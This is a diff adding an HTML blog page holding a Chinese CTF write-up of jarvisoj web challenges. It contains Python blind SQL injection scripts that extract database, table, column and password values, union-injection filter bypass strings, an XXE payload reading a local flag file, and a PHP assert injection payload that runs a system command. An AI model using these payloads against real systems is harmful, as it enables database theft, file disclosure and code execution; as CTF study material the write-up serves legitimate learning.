@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<script type="text/javascript" color="122,122,255" opacity="0.5" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Port 51直接在vps上访问即可 Simple injection12345678910111213141516171819202122import requeststemp=&amp;apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;apos;url=&amp;apos;http://web.jarvisoj.com:32">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jarvisoj web部分wp">
+<meta property="og:url" content="http://yoursite.com/2018/10/26/jarvisoj/index.html">
+<meta property="og:site_name" content="Bling_Dog">
+<meta property="og:description" content="Port 51直接在vps上访问即可 Simple injection12345678910111213141516171819202122import requeststemp=&amp;apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;apos;url=&amp;apos;http://web.jarvisoj.com:32">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-488c13340cc38e06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-20dd71f28f29bd5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-b9bcd62159cf1d6d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-39f63e11083ae742.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-5b0ee6f81711aa08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-03a481cba738889d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-11-08T13:21:02.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="jarvisoj web部分wp">
+<meta name="twitter:description" content="Port 51直接在vps上访问即可 Simple injection12345678910111213141516171819202122import requeststemp=&amp;apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;apos;url=&amp;apos;http://web.jarvisoj.com:32">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11234137-488c13340cc38e06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/26/jarvisoj/">
+
+
+
+
+
+  <title>jarvisoj web部分wp | Bling_Dog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bling_Dog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">奔向大佬路上的小白</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/26/jarvisoj/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bling_Dog">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bling_Dog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">jarvisoj web部分wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-26T15:30:26+08:00">
+                2018-10-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Port-51"><a href="#Port-51" class="headerlink" title="Port 51"></a>Port 51</h1><p>直接在vps上访问即可<br><img src="https://upload-images.jianshu.io/upload_images/11234137-488c13340cc38e06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-488c13340cc38e06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="Simple-injection"><a href="#Simple-injection" class="headerlink" title="Simple injection"></a>Simple injection</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">temp=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;</span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s=requests.session()</span><br><span class="line">user=&quot;admin&apos;and/**/substr(database(),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user1=&quot;admin&apos;and/**/substr(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=&apos;&apos;,&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">password=&apos;1&apos;</span><br><span class="line">datadase=&apos;&apos;</span><br><span class="line">for j in range(1,20):</span><br><span class="line">    for i in temp:</span><br><span class="line">        username=user.format(j,i)</span><br><span class="line">        payload=&#123;</span><br><span class="line">            &apos;username&apos;:username,</span><br><span class="line">            &apos;password&apos;:password</span><br><span class="line">        &#125;</span><br><span class="line">        # print payload</span><br><span class="line">        r=s.post(url,data=payload)</span><br><span class="line">        ppp=r.content</span><br><span class="line">        if &apos;密码错误&apos; in ppp:</span><br><span class="line">            datadase=datadase+i</span><br><span class="line">            print datadase</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">temp=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,&apos;</span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s=requests.session()</span><br><span class="line">user1=&quot;admin&apos;and/**/substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">password=&apos;1&apos;</span><br><span class="line">a=&apos;iInNjJeEcCtTiIoOnN&apos;</span><br><span class="line">datadase=&apos;&apos;</span><br><span class="line">for j in range(1,20):</span><br><span class="line">    for i in temp:</span><br><span class="line">        username=user1.format(j,i)</span><br><span class="line">        payload=&#123;</span><br><span class="line">            &apos;username&apos;:username,</span><br><span class="line">            &apos;password&apos;:password</span><br><span class="line">        &#125;</span><br><span class="line">        # print payload</span><br><span class="line">        r=s.post(url,data=payload)</span><br><span class="line">        ppp=r.content</span><br><span class="line">        if &apos;密码错误&apos; in ppp:</span><br><span class="line">            datadase=datadase+i</span><br><span class="line">            print datadase</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">temp=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,&apos;</span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s=requests.session()</span><br><span class="line">user=&quot;admin&apos;and/**/substr((select/**/database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user1=&quot;admin&apos;and/**/substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user2=&quot;admin&apos;and/**/(substring((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;admin&apos;)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)#&quot;</span><br><span class="line">password=&apos;1&apos;</span><br><span class="line">a=&apos;iInNjJeEcCtTiIoOnN&apos;</span><br><span class="line">data=&apos;&apos;</span><br><span class="line">for j in range(1,50):</span><br><span class="line">    for i in temp:</span><br><span class="line">        username=user2.format(j,i)</span><br><span class="line">        payload=&#123;</span><br><span class="line">            &apos;username&apos;:username,</span><br><span class="line">            &apos;password&apos;:password</span><br><span class="line">        &#125;</span><br><span class="line">        # print payload</span><br><span class="line">        r=s.post(url,data=payload)</span><br><span class="line">        ppp=r.content</span><br><span class="line">        if &apos;密码错误&apos; in ppp:</span><br><span class="line">            data=data+i</span><br><span class="line">            print data</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">temp=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,&apos;</span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s=requests.session()</span><br><span class="line">user=&quot;admin&apos;and/**/substr((select/**/database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user1=&quot;admin&apos;and/**/substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user2=&quot;admin&apos;and/**/(substring((select(password)from(admin)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)#&quot;</span><br><span class="line">password=&apos;1&apos;</span><br><span class="line">a=&apos;iInNjJeEcCtTiIoOnN&apos;</span><br><span class="line">data=&apos;&apos;</span><br><span class="line">for j in range(1,50):</span><br><span class="line">    for i in temp:</span><br><span class="line">        username=user2.format(j,i)</span><br><span class="line">        payload=&#123;</span><br><span class="line">            &apos;username&apos;:username,</span><br><span class="line">            &apos;password&apos;:password</span><br><span class="line">        &#125;</span><br><span class="line">        # print payload</span><br><span class="line">        r=s.post(url,data=payload)</span><br><span class="line">        ppp=r.content</span><br><span class="line">        if &apos;密码错误&apos; in ppp:</span><br><span class="line">            data=data+i</span><br><span class="line">            print data</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p>最后的得到password的md5：334cfb59c9d74849801d5acdcfdaadc3<br>解密之后得到密码：eTAloCrEP<br>这里分享一个<a href="http://cn.freemd5.com/index.php" target="_blank" rel="noopener">比较好用的md5解密网站</a></p>
+<h1 id="EASY-gallery"><a href="#EASY-gallery" class="headerlink" title="EASY gallery"></a>EASY gallery</h1><p>接触的文件上传的题目比较少，用了%00截断发现没作用，而且只允许穿jpg和png，查了wp之后才发现是图片马，他木马放到图片的内容里面，然后%00截断访问。</p>
+<h1 id="IN-A-MESS"><a href="#IN-A-MESS" class="headerlink" title="IN A MESS"></a>IN A MESS</h1><p>刚开始要获取路径，获取路径之后注入。<br>爆表:id=-1/<em>1</em>/uniunionon/<em>1</em>/seselectlect/<em>1</em>/1,2,group_concat(table_name)/<em>1</em>/frfromom/<em>1</em>/information_schema.tables/<em>1</em>/where/<em>1</em>/table_schema=database()#<br>爆列:id=-1/<em>1</em>/uniunionon/<em>1</em>selectlect/<em>1</em>/1,2,group_concat(column_name)/<em>1</em>/frfromom/<em>1</em>/information_schema.columns/<em>1</em>/where/<em>1</em>/table_name=0x636f6e74656e74#<br>爆内容:^EHT2mCpcvOLf/index.php?id=-1/<em>1</em>/uniunionon/<em>1</em>/seselectlect/<em>1</em>/1,2,group_concat(context)/<em>1</em>/frfromom/<em>1</em>/content#</p>
+<h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><p>这个题涉及到XXE的知识，之前做题没有深入了解过，这里查看了大佬的wp才了解一些。决定近期好好学一下XXE的知识。<br>抓包，改包。将content-type格式改为application/xml，然后post数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:////home/ctf/flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<p>成功得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-20dd71f28f29bd5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-20dd71f28f29bd5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h1><p>题目提示要先找源码，首先御剑扫描一波，发现index.php~<br><img src="https://upload-images.jianshu.io/upload_images/11234137-b9bcd62159cf1d6d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b9bcd62159cf1d6d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>得到源码如下，之后闭合反单引号进行注入即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$table = $_GET[&apos;table&apos;]?$_GET[&apos;table&apos;]:&quot;test&quot;;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,&quot;desc `secret_&#123;$table&#125;`&quot;) or Hacker();</span><br><span class="line">$sql = &quot;select &apos;flag&#123;xxx&#125;&apos; from secret_&#123;$table&#125;&quot;;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line">echo $ret[0];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>最终payload:<a href="http://web.jarvisoj.com:32794/index.php?table=test`%20`union%20select%20group_concat(flagUwillNeverKnow)%20from%20secret_flag%20limit%201,1--+" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`%20`union%20select%20group_concat(flagUwillNeverKnow)%20from%20secret_flag%20limit%201,1--+</a><br><img src="https://upload-images.jianshu.io/upload_images/11234137-39f63e11083ae742.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-39f63e11083ae742.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>根据页面提示，GitHack下来源码。然后利用发现index<br><img src="https://upload-images.jianshu.io/upload_images/11234137-5b0ee6f81711aa08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-5b0ee6f81711aa08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后利用发现index.php中有assert函数，assert函数可以执行php代码从而getshell。<br>代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">	$page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>最终padload:web.jarvisoj.com:32798/?page=flag%27.system(“cat%20templates/flag.php”).%27<br><img src="https://upload-images.jianshu.io/upload_images/11234137-03a481cba738889d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-03a481cba738889d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/24/phpxuliehua/" rel="next" title="PHP反序列化的一些例子">
+                <i class="fa fa-chevron-left"></i> PHP反序列化的一些例子
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/27/安恒11月/" rel="prev" title="安恒杯11月份密码学部分wp">
+                安恒杯11月份密码学部分wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Bling_Dog">
+            
+              <p class="site-author-name" itemprop="name">Bling_Dog</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/PiPiChenA" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="563667866@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Port-51"><span class="nav-number">1.</span> <span class="nav-text">Port 51</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Simple-injection"><span class="nav-number">2.</span> <span class="nav-text">Simple injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EASY-gallery"><span class="nav-number">3.</span> <span class="nav-text">EASY gallery</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IN-A-MESS"><span class="nav-number">4.</span> <span class="nav-text">IN A MESS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#api调用"><span class="nav-number">5.</span> <span class="nav-text">api调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#inject"><span class="nav-number">6.</span> <span class="nav-text">inject</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babyphp"><span class="nav-number">7.</span> <span class="nav-text">babyphp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bling_Dog</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
